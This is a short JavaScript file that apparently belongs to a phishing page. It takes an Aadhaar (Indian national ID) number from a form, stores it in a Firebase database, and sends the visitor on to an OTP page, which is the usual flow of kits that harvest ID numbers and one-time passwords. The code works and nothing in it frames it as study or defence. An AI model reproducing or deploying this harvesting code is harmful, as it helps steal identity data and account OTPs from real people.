
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var uadhar = getElementVal("uadhar");

  

  saveMessages(uadhar);

  // redirect to OTP page
  window.location.href = "otpe.html";
}

const saveMessages = (uadhar) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
    Aadhar_Number: uadhar,
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

